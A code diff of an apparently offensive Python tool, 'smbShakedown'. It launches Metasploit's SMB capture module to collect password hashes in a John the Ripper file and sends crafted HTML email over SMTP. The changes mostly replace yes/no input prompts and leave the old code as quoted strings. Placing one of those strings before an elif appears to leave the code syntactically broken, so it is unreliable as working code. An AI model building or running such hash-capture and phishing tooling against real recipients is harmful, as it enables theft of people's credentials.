@@ -69,22 +69,37 @@ def yes_no(answer):
             print ('Please respond with \'yes\' or \'no\'\n')
 
 def smbServ():
-	smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
+	
+	'''smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
+	
+
 	choice = smbServOption.lower()
 	yes = set(['yes','y', 'ye', ''])
 	no = set(['no','n'])
 	print('ENTERED: "%s"' % choice + "\n")
-	if choice in yes:
+	
+
+	if choice in yes:'''
+
+	smbServOption = yes_no('\nLaunch Metasploit\'s SMB Capture module? (y/n): ')
+	if smbServOption is True:
+
 		with open(rcfile, 'w') as f1:
 			f1.write("use auxiliary/server/capture/smb"+"\n"+\
 				"set srvhost "+get_internal_address()+"\n"+\
 				"set JOHNPWFILE /opt/smbShakedown/smb_hashes"+"\n"+\
 				"exploit -j -z")
 		os.system('msfconsole -q -r smbServ.rc')
-	elif choice in no:
+	
+
+	'''elif choice in no:
 		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
 	else:
-		sys.stdout.write("Please respond with 'yes' or 'no'")
+		sys.stdout.write("Please respond with 'yes' or 'no'")'''
+
+	elif smbServOption is False:
+		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")
+
 
 def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage):
 	smtpserver = smtplib.SMTP(smtpServerAddress, smtpServerPort)
@@ -97,7 +112,23 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 	try:
 		status = smtpserver.noop()[0]
 		print("SMTP Server Status: ",status)
-		sendOption = raw_input("Connection to SMTP Server is successful, would you like to send mail now?[yes]:") or 'yes'
+		
+		sendOption = yes_no('Connection to SMTP Server is successful, would you like to send mail now? (y/n): ')
+
+		if sendOption is True:
+			smtpserver.sendmail(senderAddress, recipientAddress, emailMessage)
+			print("Message(s) sent!")
+			smtpserver.quit()
+			return True
+		else:
+			smtpserver.quit()
+			print("Ok no mail sent.")
+			return False
+
+
+		'''sendOption = raw_input("Connection to SMTP Server is successful, would you like to send mail now?[yes]:") or 'yes'
+		
+
 		choice = sendOption.lower()
 		yes = set(['yes','y', 'ye', ''])
 		no = set(['no','n'])
@@ -112,7 +143,9 @@ def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAd
 			print("Ok no mail sent.")
 			return False
 		else:
-			sys.stdout.write("Please respond with 'yes' or 'no'")
+			sys.stdout.write("Please respond with 'yes' or 'no'")'''
+
+
 	except:
 		status = -1
 		print("[Aborting]SMTP Server Status: ",status)
@@ -220,7 +253,7 @@ def main():
 				redirect = ''
 			'''else:
 				sys.stdout.write("Please respond with 'yes' or 'no'")'''
-				
+
 		### EDIT: HTML Template Below ###
 		### Becareful not to remove the variables {0} and {1} ###
 			html = """
